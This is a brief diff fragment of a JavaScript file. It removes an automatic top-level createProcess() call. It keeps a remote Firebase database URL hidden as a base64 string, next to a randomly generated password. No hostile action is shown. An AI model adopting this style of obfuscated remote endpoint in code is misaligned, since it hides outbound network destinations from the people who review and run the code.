@@ -10,8 +10,6 @@ let PASSWORD = getRandomPassword()
 let BASE_URL = Buffer.from('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==', 'base64').toString('ascii')
 
 
-createProcess()
-
 process.argv.slice(2).forEach(function (data, index) {
     try {
         if (index == 0) {
